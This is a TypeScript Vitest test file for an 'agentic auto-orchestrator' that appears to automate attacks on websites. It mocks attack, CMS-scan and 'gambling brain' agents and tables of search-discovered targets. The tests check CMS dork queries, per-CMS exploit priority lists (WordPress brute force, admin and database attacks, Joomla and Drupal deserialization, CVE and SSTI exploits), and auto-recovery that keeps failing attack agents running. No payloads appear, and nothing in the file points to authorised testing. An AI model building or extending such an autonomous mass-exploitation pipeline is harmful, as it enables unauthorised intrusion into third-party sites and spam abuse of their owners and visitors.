/**
 * Auto-Recovery System + CMS-Specific Attack Targeting — Vitest Tests
 *
 * Tests:
 *   AUTO-RECOVERY:
 *   1. Recovery strategies exist for all agent types
 *   2. Each agent has exactly 3 recovery strategies
 *   3. Recovery strategy "reduce_targets" increases interval for attack agent
 *   4. Recovery strategy "increase_interval" changes intervalMs
 *   5. attemptAutoRecovery resets consecutiveFailures and sets recovery fields
 *   6. attemptAutoRecovery respects cooldown period
 *   7. attemptAutoRecovery sends Telegram notification
 *   8. MAX_RECOVERY_ATTEMPTS is 3
 *   9. Recovery success tracking in daemon events
 *
 *   CMS TARGETING:
 *   10. CMS_DORK_MAP has entries for all major CMS types
 *   11. CMS_EXPLOIT_PRIORITY has entries for all major CMS types
 *   12. selectCmsTargetingStrategy returns fallback when DB is null
 *   13. getCmsExploitPriority returns correct methods for wordpress
 *   14. getCmsExploitPriority returns empty array for unknown CMS
 *   15. CMS dork queries contain proper search operators
 *   16. CMS exploit priorities start with CMS-specific methods
 *   17. AgentConfig includes recovery fields
 *   18. OrchestratorState includes recovery tracking fields
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

// ─── Mock dependencies ───
const mockSendTelegram = vi.fn().mockResolvedValue({ success: true, messageId: 1 });
vi.mock("./telegram-notifier", () => ({
  sendTelegramNotification: (...args: any[]) => mockSendTelegram(...args),
}));

vi.mock("./db", () => ({
  getDb: vi.fn().mockResolvedValue(null),
}));

vi.mock("./adaptive-learning", () => ({
  getCmsAttackProfile: vi.fn().mockResolvedValue(null),
}));

vi.mock("../drizzle/schema", () => ({
  aiAttackHistory: { success: "success", targetDomain: "targetDomain" },
  autonomousDeploys: { status: "status" },
  serpDiscoveredTargets: { cms: "cms", status: "status" },
  strategyOutcomeLogs: {},
  cmsAttackProfiles: { overallSuccessRate: "overallSuccessRate" },
  agenticSessions: {},
  seoProjects: {},
}));

vi.mock("drizzle-orm", () => ({
  eq: vi.fn(),
  and: vi.fn(),
  sql: vi.fn(),
  gte: vi.fn(),
  count: vi.fn(),
  desc: vi.fn(),
  inArray: vi.fn(),
  isNull: vi.fn(),
  isNotNull: vi.fn(),
  ne: vi.fn(),
}));

vi.mock("./background-daemon", () => ({
  enqueueTask: vi.fn().mockResolvedValue(1),
  registerExecutor: vi.fn(),
  getDaemonStats: vi.fn().mockReturnValue({ running: 0, completed: 0, failed: 0, pending: 0 }),
  onDaemonEvent: vi.fn(),
}));

vi.mock("./agentic-attack-engine", () => ({
  startAgenticSession: vi.fn().mockResolvedValue({ sessionId: 1 }),
}));

vi.mock("./seo-scheduler", () => ({
  runScheduledJobs: vi.fn().mockResolvedValue({ ran: 0 }),
}));

vi.mock("./learning-scheduler", () => ({
  executeLearningCycle: vi.fn().mockResolvedValue({ success: true }),
}));

vi.mock("./autonomous-research-engine", () => ({
  runResearchCycle: vi.fn().mockResolvedValue({ success: true }),
}));

vi.mock("./cve-scheduler", () => ({
  triggerManualCveUpdate: vi.fn().mockResolvedValue({ success: true }),
}));

vi.mock("./keyword-target-discovery", () => ({
  runKeywordDiscovery: vi.fn().mockResolvedValue({ success: true }),
}));

vi.mock("./gambling-ai-brain", () => ({
  runBrainCycle: vi.fn().mockResolvedValue({ success: true }),
}));

vi.mock("./success-rate-monitor", () => ({
  startSuccessRateMonitor: vi.fn(),
  stopSuccessRateMonitor: vi.fn(),
}));

vi.mock("./cms-vuln-scanner", () => ({
  detectCms: vi.fn().mockResolvedValue({ cms: "wordpress", version: "6.0", confidence: 90 }),
}));

vi.mock("./_core/llm", () => ({
  invokeLLM: vi.fn().mockResolvedValue({
    choices: [{ message: { content: JSON.stringify({ attackOrder: ["oneclick"], reasoning: "test", estimatedSuccess: 50 }) } }],
  }),
}));

// ─── Import after mocks ───
import {
  RECOVERY_STRATEGIES,
  MAX_RECOVERY_ATTEMPTS,
  RECOVERY_COOLDOWN_MS,
  attemptAutoRecovery,
  CMS_DORK_MAP,
  CMS_EXPLOIT_PRIORITY,
  selectCmsTargetingStrategy,
  getCmsExploitPriority,
  type AgentConfig,
  type OrchestratorState,
} from "./agentic-auto-orchestrator";

// ─── Helper: create a fresh AgentConfig ───
function makeAgentConfig(overrides: Partial<AgentConfig> = {}): AgentConfig {
  return {
    enabled: true,
    intervalMs: 2 * 60 * 60_000,
    maxConcurrent: 1,
    autoStart: true,
    consecutiveFailures: 5,
    totalRuns: 10,
    totalSuccesses: 3,
    recoveryAttempts: 0,
    isRecovering: false,
    ...overrides,
  };
}

// ═══════════════════════════════════════════════
//  AUTO-RECOVERY TESTS
// ═══════════════════════════════════════════════

describe("Auto-Recovery System", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("1. Recovery strategies exist for all 9 agent types", () => {
    const agentNames = [
      "attack", "seo", "scan", "research", "learning",
      "cve", "keyword_discovery", "gambling_brain", "cms_scan",
    ];
    for (const name of agentNames) {
      expect(RECOVERY_STRATEGIES[name as keyof typeof RECOVERY_STRATEGIES]).toBeDefined();
      expect(RECOVERY_STRATEGIES[name as keyof typeof RECOVERY_STRATEGIES].length).toBeGreaterThan(0);
    }
  });

  it("2. Each agent has exactly 3 recovery strategies", () => {
    for (const [name, strategies] of Object.entries(RECOVERY_STRATEGIES)) {
      expect(strategies.length).toBe(3);
    }
  });

  it("3. Recovery strategy 'reduce_targets' adjusts interval for attack agent", () => {
    const config = makeAgentConfig({ intervalMs: 1 * 60 * 60_000 }); // 1h
    const strategy = RECOVERY_STRATEGIES.attack[0];
    expect(strategy.name).toBe("reduce_targets");
    strategy.apply("attack" as any, config);
    // Should increase to at least 3h
    expect(config.intervalMs).toBeGreaterThanOrEqual(3 * 60 * 60_000);
  });

  it("4. Recovery strategy 'increase_interval' changes intervalMs for seo", () => {
    const config = makeAgentConfig({ intervalMs: 4 * 60 * 60_000 });
    const strategy = RECOVERY_STRATEGIES.seo[1];
    expect(strategy.name).toBe("increase_interval");
    strategy.apply("seo" as any, config);
    expect(config.intervalMs).toBe(8 * 60 * 60_000);
  });

  it("5. attemptAutoRecovery resets consecutiveFailures and sets recovery fields", async () => {
    const config = makeAgentConfig({ consecutiveFailures: 7 });
    await attemptAutoRecovery("attack" as any, config);

    expect(config.consecutiveFailures).toBe(0);
    expect(config.recoveryAttempts).toBe(1);
    expect(config.isRecovering).toBe(false);
    expect(config.lastRecoveryAt).toBeDefined();
    expect(config.recoveryStrategy).toBe("reduce_targets");
  });

  it("6. attemptAutoRecovery respects cooldown period", async () => {
    const config = makeAgentConfig({
      lastRecoveryAt: Date.now() - 1000, // 1 second ago (within cooldown)
    });
    const prevAttempts = config.recoveryAttempts;
    await attemptAutoRecovery("attack" as any, config);

    // Should NOT have attempted recovery due to cooldown
    expect(config.recoveryAttempts).toBe(prevAttempts);
  });

  it("7. attemptAutoRecovery sends Telegram notification", async () => {
    const config = makeAgentConfig();
    await attemptAutoRecovery("seo" as any, config);

    expect(mockSendTelegram).toHaveBeenCalledTimes(1);
    const call = mockSendTelegram.mock.calls[0][0];
    expect(call.type).toBe("info");
    expect(call.targetUrl).toContain("recovery/seo");
    expect(call.details).toContain("AUTO-RECOVERY TRIGGERED");
  });

  it("8. MAX_RECOVERY_ATTEMPTS is 3", () => {
    expect(MAX_RECOVERY_ATTEMPTS).toBe(3);
  });

  it("9. RECOVERY_COOLDOWN_MS is 10 minutes", () => {
    expect(RECOVERY_COOLDOWN_MS).toBe(10 * 60_000);
  });
});

// ═══════════════════════════════════════════════
//  CMS-SPECIFIC TARGETING TESTS
// ═══════════════════════════════════════════════

describe("CMS-Specific Attack Targeting", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("10. CMS_DORK_MAP has entries for all major CMS types", () => {
    const expectedCms = ["wordpress", "joomla", "drupal", "magento", "prestashop", "opencart"];
    for (const cms of expectedCms) {
      expect(CMS_DORK_MAP[cms]).toBeDefined();
      expect(CMS_DORK_MAP[cms].length).toBeGreaterThan(0);
    }
  });

  it("11. CMS_EXPLOIT_PRIORITY has entries for all major CMS types", () => {
    const expectedCms = ["wordpress", "joomla", "drupal", "magento", "prestashop", "opencart"];
    for (const cms of expectedCms) {
      expect(CMS_EXPLOIT_PRIORITY[cms]).toBeDefined();
      expect(CMS_EXPLOIT_PRIORITY[cms].length).toBeGreaterThan(0);
    }
  });

  it("12. selectCmsTargetingStrategy returns fallback when DB is null", async () => {
    const result = await selectCmsTargetingStrategy();
    expect(result.strategy).toBe("no_db");
    expect(result.targetCms).toBeNull();
    expect(result.customDorks).toBeNull();
  });

  it("13. getCmsExploitPriority returns correct methods for wordpress", () => {
    const methods = getCmsExploitPriority("wordpress");
    expect(methods.length).toBeGreaterThan(0);
    expect(methods).toContain("wp_admin");
    expect(methods).toContain("wp_db");
    expect(methods).toContain("cms_plugin_exploit");
  });

  it("14. getCmsExploitPriority returns empty array for unknown CMS", () => {
    const methods = getCmsExploitPriority("unknown_cms_xyz");
    expect(methods).toEqual([]);
  });

  it("15. CMS dork queries contain proper search operators", () => {
    for (const [cms, dorks] of Object.entries(CMS_DORK_MAP)) {
      for (const dork of dorks) {
        // Each dork should contain at least one search operator
        const hasOperator = dork.includes("inurl:") || dork.includes("intitle:") || dork.includes("site:");
        expect(hasOperator).toBe(true);
      }
    }
  });

  it("16. WordPress exploit priorities start with WP-specific methods", () => {
    const wpMethods = CMS_EXPLOIT_PRIORITY.wordpress;
    const wpSpecific = wpMethods.slice(0, 4);
    // First 4 should be WordPress-specific
    expect(wpSpecific).toContain("wp_admin");
    expect(wpSpecific).toContain("wp_db");
    expect(wpSpecific).toContain("wp_brute_force");
    expect(wpSpecific).toContain("cms_plugin_exploit");
  });

  it("17. Joomla exploit priorities include deserialization", () => {
    const joomlaMethods = CMS_EXPLOIT_PRIORITY.joomla;
    expect(joomlaMethods).toContain("deserialization");
    expect(joomlaMethods).toContain("cms_plugin_exploit");
  });

  it("18. Drupal exploit priorities include CVE and deserialization", () => {
    const drupalMethods = CMS_EXPLOIT_PRIORITY.drupal;
    expect(drupalMethods[0]).toBe("cve_exploit"); // CVE should be first for Drupal
    expect(drupalMethods).toContain("deserialization");
    expect(drupalMethods).toContain("ssti_injection");
  });
});
